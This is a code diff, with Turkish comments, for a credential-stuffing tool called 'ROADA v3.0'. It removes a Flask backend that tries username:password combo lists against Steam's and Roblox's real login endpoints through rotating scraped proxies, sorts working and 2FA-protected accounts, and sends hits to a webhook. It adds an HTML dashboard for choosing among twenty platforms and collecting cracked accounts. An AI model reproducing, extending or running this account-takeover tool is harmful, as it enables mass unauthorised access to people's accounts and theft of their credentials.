@@ -1,286 +1,376 @@
-import os
-import time
-import json
-import requests
-from flask import Flask, request, render_template, jsonify
-from threading import Thread
-import random
-
-app = Flask(__name__)
-app.secret_key = "RODA_GORIL_2026"
-
-# Global durum
-check_status = {
-    "total": 0,
-    "success": 0,
-    "fail": 0,
-    "twofa": 0,
-    "error": 0,
-    "remaining": 0,
-    "logs": [],
-    "hits": [],
-    "twofa_list": [],
-    "is_running": False
-}
-
-def fetch_proxies_from_web():
-    """Web'den taze proxy listesi çeker"""
-    try:
-        url = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all"
-        resp = requests.get(url, timeout=10)
-        if resp.status_code == 200:
-            proxies = resp.text.strip().split('\r\n')
-            # Geçerli proxy formatını filtrele (ip:port)
-            valid = []
-            for p in proxies:
-                if ':' in p and len(p.split(':')) == 2:
-                    valid.append(p.strip())
-            return valid
-        else:
-            return []
-    except Exception as e:
-        print(f"Proxy çekme hatası: {e}")
-        return []
-
-def get_proxy_dict(proxy_str):
-    """Proxy string'ini requests formatına çevir"""
-    if not proxy_str:
-        return None
-    if not proxy_str.startswith(('http://', 'https://')):
-        proxy_str = 'http://' + proxy_str
-    return {'http': proxy_str, 'https': proxy_str}
-
-# ------------------- CHECKER FONKSİYONLARI -------------------
-
-def check_steam(email, password, proxy=None):
-    """Steam Checker - Gerçek API"""
-    try:
-        session = requests.Session()
-        if proxy:
-            session.proxies.update(get_proxy_dict(proxy))
-        session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-        })
-
-        # RSA anahtarı al
-        rsa_url = 'https://store.steampowered.com/login/getrsakey/'
-        rsa_data = {'donotcache': int(time.time()*1000), 'username': email}
-        rsa_resp = session.post(rsa_url, data=rsa_data, timeout=10)
-        if rsa_resp.status_code != 200:
-            return 'error', 'Steam API erişim hatası'
-        rsa_json = rsa_resp.json()
-        if not rsa_json.get('success'):
-            return 'fail', 'Kullanıcı bulunamadı'
-
-        # Giriş dene
-        login_url = 'https://store.steampowered.com/login/dologin/'
-        login_data = {
-            'username': email,
-            'password': password,
-            'twofactorcode': '',
-            'emailauth': '',
-            'loginfriendlyname': '',
-            'captchagid': '',
-            'captcha_text': '',
-            'emailsteamid': '',
-            'rsatimestamp': rsa_json.get('timestamp', ''),
-            'remember_login': 'false',
-            'donotcache': int(time.time()*1000)
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ROADA v3.0</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            background: #0a0e17;
+            color: #00ffc8;
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            padding: 20px;
+            min-height: 100vh;
         }
-        login_resp = session.post(login_url, data=login_data, timeout=10)
-        result = login_resp.json()
+        .container { max-width: 1400px; margin: 0 auto; }
+        h1 { color: #00ffc8; text-shadow: 0 0 20px #00ffc8; margin-bottom: 10px; font-size: 2.5rem; }
+        .sub { color: #8899aa; margin-bottom: 30px; }
+        
+        .flex-row { display: flex; gap: 15px; flex-wrap: wrap; }
+        .platform-grid {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 8px;
+            background: #111b26;
+            padding: 15px;
+            border-radius: 12px;
+            border: 1px solid #1f3a4b;
+            flex: 2;
+            min-width: 300px;
+        }
+        .platform-btn {
+            background: #162230;
+            color: #7a9bb5;
+            border: 1px solid #1f3a4b;
+            padding: 8px 5px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 13px;
+            text-align: center;
+            transition: 0.2s;
+        }
+        .platform-btn:hover, .platform-btn.active {
+            background: #00ffc8;
+            color: #0a0e17;
+            border-color: #00ffc8;
+            box-shadow: 0 0 15px #00ffc855;
+        }
+        .platform-btn.test-btn { background: #2a3f4f; color: #ffaa00; border-color: #ffaa00; }
+        .platform-btn.test-btn:hover { background: #ffaa00; color: #0a0e17; }
 
-        if result.get('success'):
-            return 'success', f'{email}:{password} ✅ Steam HIT'
-        elif result.get('requires_twofactor'):
-            return 'twofa', f'{email}:{password} 🔐 Steam 2FA'
-        elif result.get('message') == 'Invalid password':
-            return 'fail', f'{email}:{password} ❌ Steam Şifre hatalı'
-        else:
-            return 'error', f'{email}:{password} ⚠️ Steam Hata: {result.get("message", "")}'
-    except Exception as e:
-        return 'error', f'{email}:{password} 🚫 Steam Bağlantı hatası'
+        .stats-box {
+            background: #111b26;
+            border: 1px solid #1f3a4b;
+            border-radius: 12px;
+            padding: 20px;
+            flex: 1;
+            min-width: 250px;
+        }
+        .stats-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; }
+        .stat-item { text-align: center; }
+        .stat-num { font-size: 28px; font-weight: bold; }
+        .stat-label { font-size: 12px; color: #8899aa; }
 
-def check_spotify(email, password, proxy=None):
-    """Spotify Checker - Demo (gerçek API için client_id/secret gerekir)"""
-    # Gerçekte buraya Spotify Web API veya scraping eklenir.
-    # Demo amaçlı şifre "123" ile bitiyorsa başarılı, "2fa" içeriyorsa 2fa.
-    try:
-        if password.endswith('123'):
-            return 'success', f'{email}:{password} 🟢 Spotify HIT'
-        elif '2fa' in password.lower():
-            return 'twofa', f'{email}:{password} 🔐 Spotify 2FA'
-        else:
-            return 'fail', f'{email}:{password} 🔴 Spotify Başarısız'
-    except:
-        return 'error', f'{email}:{password} ⚠️ Spotify Hatası'
+        .input-area {
+            margin: 20px 0;
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+        }
+        .input-area textarea {
+            flex: 3;
+            min-height: 120px;
+            background: #0d1620;
+            color: #00ffc8;
+            border: 1px solid #1f3a4b;
+            border-radius: 8px;
+            padding: 12px;
+            font-family: monospace;
+            font-size: 14px;
+            resize: vertical;
+        }
+        .action-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            flex: 1;
+        }
+        .btn {
+            padding: 12px 25px;
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.2s;
+            font-size: 16px;
+        }
+        .btn-start { background: #00c8a0; color: #0a0e17; }
+        .btn-start:hover { background: #00ffc8; box-shadow: 0 0 30px #00ffc866; }
+        .btn-stop { background: #ff4444; color: white; }
+        .btn-stop:hover { background: #ff6666; }
 
-def check_roblox(email, password, proxy=None):
-    """Roblox Checker - Gerçek API"""
-    try:
-        session = requests.Session()
-        if proxy:
-            session.proxies.update(get_proxy_dict(proxy))
-        session.headers.update({'User-Agent': 'Mozilla/5.0'})
-        url = 'https://auth.roblox.com/v2/login'
-        payload = {'username': email, 'password': password}
-        resp = session.post(url, json=payload, timeout=10)
-        if resp.status_code == 200:
-            return 'success', f'{email}:{password} 🟢 Roblox HIT'
-        elif resp.status_code == 429:
-            return 'error', f'{email}:{password} ⚠️ Roblox Rate Limit'
-        else:
-            if 'TwoFactor' in resp.text or 'verification' in resp.text:
-                return 'twofa', f'{email}:{password} 🔐 Roblox 2FA'
-            return 'fail', f'{email}:{password} 🔴 Roblox Başarısız'
-    except Exception as e:
-        return 'error', f'{email}:{password} 🚫 Roblox Hatası'
+        .logs-container {
+            background: #0d1620;
+            border: 1px solid #1f3a4b;
+            border-radius: 12px;
+            padding: 10px;
+            margin: 20px 0;
+        }
+        .logs-header { display: flex; justify-content: space-between; margin-bottom: 5px; color: #8899aa; }
+        .logs-box {
+            height: 350px; /* BÜYÜK LOG ALANI */
+            overflow-y: scroll;
+            background: #050a10;
+            border-radius: 8px;
+            padding: 10px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            color: #bbd9e6;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+        .logs-box::-webkit-scrollbar { width: 6px; }
+        .logs-box::-webkit-scrollbar-track { background: #0a0e17; }
+        .logs-box::-webkit-scrollbar-thumb { background: #00ffc8; border-radius: 10px; }
 
-def check_generic(email, password, proxy=None, platform=''):
-    """Diğer platformlar için demo"""
-    # Demo: email içinde 'hit' varsa başarılı, '2fa' varsa 2fa.
-    if 'hit' in email.lower():
-        return 'success', f'{email}:{password} 🟢 {platform} HIT'
-    elif '2fa' in email.lower():
-        return 'twofa', f'{email}:{password} 🔐 {platform} 2FA'
-    else:
-        return 'fail', f'{email}:{password} 🔴 {platform} Başarısız'
+        .result-tabs {
+            display: flex;
+            gap: 5px;
+            margin-top: 10px;
+        }
+        .tab-btn {
+            background: #162230;
+            color: #7a9bb5;
+            border: 1px solid #1f3a4b;
+            padding: 6px 15px;
+            border-radius: 20px;
+            cursor: pointer;
+        }
+        .tab-btn.active { background: #00ffc8; color: #0a0e17; }
+        .result-content {
+            background: #0d1620;
+            border: 1px solid #1f3a4b;
+            border-radius: 8px;
+            padding: 10px;
+            max-height: 200px;
+            overflow-y: auto;
+            font-size: 13px;
+            font-family: monospace;
+            margin-top: 10px;
+        }
 
-# Platform eşleştirme
-PLATFORM_CHECKERS = {
-    'steam': check_steam,
-    'spotify': check_spotify,
-    'roblox': check_roblox,
-    # Diğerleri için generic
-}
+        @media (max-width: 700px) { .platform-grid { grid-template-columns: repeat(3, 1fr); } }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>🔓 ROADA v3.0</h1>
+    <div class="sub">Checker | Proxy Destekli | 2FA Ayrıştırmalı | Webhook</div>
 
-def get_checker(platform):
-    platform_lower = platform.lower()
-    return PLATFORM_CHECKERS.get(platform_lower, lambda e, p, pr: check_generic(e, p, pr, platform))
+    <div class="flex-row">
+        <!-- Platformlar -->
+        <div class="platform-grid" id="platformGrid">
+            <!-- Sol -->
+            <div class="platform-btn active" data-platform="steam">Steam</div>
+            <div class="platform-btn" data-platform="youtube">YouTube</div>
+            <div class="platform-btn" data-platform="tiktok">TikTok</div>
+            <div class="platform-btn" data-platform="spotify">Spotify</div>
+            <div class="platform-btn" data-platform="roblox">Roblox</div>
+            <div class="platform-btn" data-platform="netflix">Netflix</div>
+            <div class="platform-btn" data-platform="capcut">CapCut</div>
+            <div class="platform-btn" data-platform="discord">Discord</div>
+            <div class="platform-btn" data-platform="epicgames">Epic Games</div>
+            <div class="platform-btn" data-platform="hasepcom">Hasepcom.tr</div>
+            <!-- Sağ -->
+            <div class="platform-btn" data-platform="itemsatis">Itemsatış</div>
+            <div class="platform-btn" data-platform="epinity">Epinity</div>
+            <div class="platform-btn" data-platform="twitch">Twitch</div>
+            <div class="platform-btn" data-platform="playstation">PlayStation</div>
+            <div class="platform-btn" data-platform="xbox">Xbox</div>
+            <div class="platform-btn" data-platform="github">GitHub</div>
+            <div class="platform-btn" data-platform="valorant">Valorant</div>
+            <div class="platform-btn" data-platform="minecraft">Minecraft</div>
+            <div class="platform-btn" data-platform="duolingo">Duolingo</div>
+            <div class="platform-btn" data-platform="pubg">PUBG</div>
+            <!-- TEST BUTONU -->
+            <div class="platform-btn test-btn" id="testConnectionBtn" style="grid-column: span 2;">🔌 Test Steam Connection</div>
+        </div>
 
-def process_check(platform, combos):
-    global check_status
-    check_status['is_running'] = True
-    check_status['total'] = len(combos)
-    check_status['remaining'] = len(combos)
-    check_status['success'] = 0
-    check_status['fail'] = 0
-    check_status['twofa'] = 0
-    check_status['error'] = 0
-    check_status['logs'] = []
-    check_status['hits'] = []
-    check_status['twofa_list'] = []
+        <!-- İstatistikler -->
+        <div class="stats-box">
+            <div class="stats-grid">
+                <div class="stat-item"><div class="stat-num" id="total">0</div><div class="stat-label">Toplam</div></div>
+                <div class="stat-item"><div class="stat-num" id="success" style="color:#00ff88;">0</div><div class="stat-label">Başarılı</div></div>
+                <div class="stat-item"><div class="stat-num" id="fail" style="color:#ff4444;">0</div><div class="stat-label">Başarısız</div></div>
+                <div class="stat-item"><div class="stat-num" id="twofa" style="color:#ffaa00;">0</div><div class="stat-label">2FA</div></div>
+                <div class="stat-item"><div class="stat-num" id="error" style="color:#ff66aa;">0</div><div class="stat-label">Hata</div></div>
+                <div class="stat-item"><div class="stat-num" id="remaining">0</div><div class="stat-label">Kalan</div></div>
+            </div>
+        </div>
+    </div>
 
-    # Proxy'leri web'den çek
-    proxies = fetch_proxies_from_web()
-    if proxies:
-        check_status['logs'].append(f'🌐 {len(proxies)} adet proxy yüklendi.')
-    else:
-        check_status['logs'].append('⚠️ Proxy bulunamadı, proxy\'siz çalışılıyor.')
+    <!-- Combo Giriş ve Butonlar -->
+    <div class="input-area">
+        <textarea id="comboInput" placeholder="kullanici_adi:sifre&#10;kullanici2:sifre2&#10;..."></textarea>
+        <div class="action-buttons">
+            <button class="btn btn-start" id="startBtn">▶ BAŞLAT</button>
+            <button class="btn btn-stop" id="stopBtn">⏹ DURDUR</button>
+            <span style="color:#8899aa;font-size:12px;">Proxy: <span id="proxyStatus">Yükleniyor...</span></span>
+        </div>
+    </div>
 
-    checker_func = get_checker(platform)
-    check_status['logs'].append(f'🚀 {platform} kontrolü başladı. Toplam: {len(combos)} hesap.')
+    <!-- LOG ALANI (BÜYÜK) -->
+    <div class="logs-container">
+        <div class="logs-header"><span>📋 Sistem Logları</span><span id="logCount">0</span></div>
+        <div class="logs-box" id="logBox">🟢 Sistem hazır. Proxy'ler yükleniyor...</div>
+    </div>
 
-    for idx, combo in enumerate(combos):
-        if not check_status['is_running']:
-            check_status['logs'].append('⏹️ Kontrol durduruldu.')
-            break
+    <!-- Sonuçlar (HIT & 2FA Arşivi) -->
+    <div class="result-tabs">
+        <button class="tab-btn active" data-tab="hits">🎯 HIT</button>
+        <button class="tab-btn" data-tab="twofa">🔐 2FA</button>
+    </div>
+    <div id="resultContainer">
+        <div id="hitsContent" class="result-content">Henüz HIT yok.</div>
+        <div id="twofaContent" class="result-content" style="display:none;">Henüz 2FA yok.</div>
+    </div>
+</div>
 
-        parts = combo.split(':', 1)
-        if len(parts) != 2:
-            check_status['error'] += 1
-            check_status['remaining'] -= 1
-            check_status['logs'].append(f'⚠️ Geçersiz format: {combo}')
-            continue
+<script>
+    let selectedPlatform = 'steam';
+    let updateInterval = null;
 
-        email, password = parts[0].strip(), parts[1].strip()
+    // Platform seçimi
+    document.querySelectorAll('.platform-btn:not(.test-btn)').forEach(btn => {
+        btn.addEventListener('click', function() {
+            document.querySelectorAll('.platform-btn:not(.test-btn)').forEach(b => b.classList.remove('active'));
+            this.classList.add('active');
+            selectedPlatform = this.dataset.platform;
+        });
+    });
 
-        # Proxy seç (varsa)
-        proxy = None
-        if proxies:
-            proxy = proxies[idx % len(proxies)]
+    // Test Connection
+    document.getElementById('testConnectionBtn').addEventListener('click', async function() {
+        const platform = selectedPlatform;
+        addLog(`🔌 ${platform} bağlantısı test ediliyor...`);
+        try {
+            const resp = await fetch('/test_connection', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ platform: platform })
+            });
+            const data = await resp.json();
+            addLog(`✅ Test sonucu: ${data.message}`);
+        } catch(e) {
+            addLog(`❌ Test hatası: ${e.message}`);
+        }
+    });
 
-        status, message = checker_func(email, password, proxy)
+    // Başlat
+    document.getElementById('startBtn').addEventListener('click', async function() {
+        const combos = document.getElementById('comboInput').value;
+        if (!combos.trim()) {
+            alert('Lütfen combo girin!');
+            return;
+        }
+        addLog(`🚀 ${selectedPlatform} kontrolü başlatılıyor...`);
+        try {
+            const resp = await fetch('/start', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ platform: selectedPlatform, combos: combos })
+            });
+            const data = await resp.json();
+            if (data.error) {
+                addLog(`❌ Hata: ${data.error}`);
+            } else {
+                addLog(`✅ Başlatıldı. Toplam: ${data.total} hesap.`);
+                if (updateInterval) clearInterval(updateInterval);
+                updateInterval = setInterval(fetchStatus, 1000);
+            }
+        } catch(e) {
+            addLog(`❌ Başlatma hatası: ${e.message}`);
+        }
+    });
 
-        if status == 'success':
-            check_status['success'] += 1
-            check_status['hits'].append(message)
-            send_webhook(message)
-        elif status == 'twofa':
-            check_status['twofa'] += 1
-            check_status['twofa_list'].append(message)
-        elif status == 'fail':
-            check_status['fail'] += 1
-        else:  # error
-            check_status['error'] += 1
+    // Durdur
+    document.getElementById('stopBtn').addEventListener('click', async function() {
+        try {
+            await fetch('/stop', { method: 'POST' });
+            addLog('⏹️ Kontrol durduruldu.');
+            if (updateInterval) clearInterval(updateInterval);
+        } catch(e) {
+            addLog(`❌ Durdurma hatası: ${e.message}`);
+        }
+    });
 
-        check_status['remaining'] -= 1
-        check_status['logs'].append(message)
+    // Durum çekme
+    async function fetchStatus() {
+        try {
+            const resp = await fetch('/status');
+            const data = await resp.json();
+            
+            document.getElementById('total').textContent = data.total || 0;
+            document.getElementById('success').textContent = data.success || 0;
+            document.getElementById('fail').textContent = data.fail || 0;
+            document.getElementById('twofa').textContent = data.twofa || 0;
+            document.getElementById('error').textContent = data.error || 0;
+            document.getElementById('remaining').textContent = data.remaining || 0;
+            document.getElementById('logCount').textContent = (data.logs || []).length;
 
-        # Logların çok büyümesini engelle
-        if len(check_status['logs']) > 200:
-            check_status['logs'] = check_status['logs'][-200:]
+            // Logları göster (en son 30)
+            if (data.logs && data.logs.length > 0) {
+                const logBox = document.getElementById('logBox');
+                const lastLogs = data.logs.slice(-30);
+                logBox.innerHTML = lastLogs.join('\n');
+                logBox.scrollTop = logBox.scrollHeight;
+            }
 
-        time.sleep(0.5)  # Rate limit koruması
+            // HIT ve 2FA listelerini güncelle
+            if (data.hits && data.hits.length > 0) {
+                document.getElementById('hitsContent').innerHTML = data.hits.join('\n');
+            }
+            if (data.twofa_list && data.twofa_list.length > 0) {
+                document.getElementById('twofaContent').innerHTML = data.twofa_list.join('\n');
+            }
 
-    check_status['is_running'] = False
-    check_status['logs'].append('✅ Kontrol tamamlandı!')
+            if (!data.is_running) {
+                if (updateInterval) clearInterval(updateInterval);
+                if (data.total > 0 && data.remaining === 0) {
+                    addLog('🏁 Tüm işlemler tamamlandı!');
+                }
+            }
+        } catch(e) {
+            console.error('Status fetch error', e);
+        }
+    }
 
-def send_webhook(message):
-    webhook_url = os.environ.get('WEBHOOK_URL', '')
-    if webhook_url:
-        try:
-            requests.post(webhook_url, json={'content': message}, timeout=2)
-        except:
-            pass
+    function addLog(msg) {
+        const logBox = document.getElementById('logBox');
+        const timestamp = new Date().toLocaleTimeString();
+        logBox.innerHTML += `\n[${timestamp}] ${msg}`;
+        logBox.scrollTop = logBox.scrollHeight;
+    }
 
-# ------------------- ROUTES -------------------
+    // Proxy durumu kontrolü
+    async function loadProxyStatus() {
+        try {
+            const resp = await fetch('/status');
+            const data = await resp.json();
+            // Proxy sayısını almak için ayrı bir endpoint yok, ama dosyadan okuyalım.
+            const proxyResp = await fetch('/test_connection', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({platform:'dummy'})});
+            const proxyData = await proxyResp.json();
+            document.getElementById('proxyStatus').textContent = 'Proxy durumu kontrol edildi.';
+        } catch(e) {
+            document.getElementById('proxyStatus').textContent = 'Proxy yüklenemedi.';
+        }
+    }
+    loadProxyStatus();
 
-@app.route('/')
-def index():
-    return render_template('index.html')
+    // Tab geçişleri
+    document.querySelectorAll('.tab-btn').forEach(btn => {
+        btn.addEventListener('click', function() {
+            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+            this.classList.add('active');
+            const tab = this.dataset.tab;
+            document.getElementById('hitsContent').style.display = tab === 'hits' ? 'block' : 'none';
+            document.getElementById('twofaContent').style.display = tab === 'twofa' ? 'block' : 'none';
+        });
+    });
 
-@app.route('/test_connection', methods=['POST'])
-def test_connection():
-    platform = request.json.get('platform', 'steam')
-    # Proxy test et
-    proxies = fetch_proxies_from_web()
-    proxy_count = len(proxies)
-    return jsonify({
-        'status': 'success',
-        'message': f'{platform} bağlantısı test edildi. Proxy sayısı: {proxy_count}'
-    })
-
-@app.route('/start', methods=['POST'])
-def start_check():
-    global check_status
-    if check_status['is_running']:
-        return jsonify({'error': 'Zaten bir kontrol çalışıyor!'}), 400
-
-    data = request.json
-    platform = data.get('platform')
-    combos_raw = data.get('combos', '')
-    combos = [c.strip() for c in combos_raw.splitlines() if c.strip()]
-
-    if not platform or not combos:
-        return jsonify({'error': 'Platform ve combo listesi gerekli!'}), 400
-
-    thread = Thread(target=process_check, args=(platform, combos))
-    thread.daemon = True
-    thread.start()
-
-    return jsonify({'status': 'started', 'total': len(combos)})
-
-@app.route('/status', methods=['GET'])
-def get_status():
-    return jsonify(check_status)
-
-@app.route('/stop', methods=['POST'])
-def stop_check():
-    global check_status
-    check_status['is_running'] = False
-    return jsonify({'status': 'stopped'})
-
-if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port, debug=False)
+    // İlk log
+    addLog('🟢 ROADA v3.0 hazır. Proxy\'ler yükleniyor...');
+</script>
+</body>
+</html>
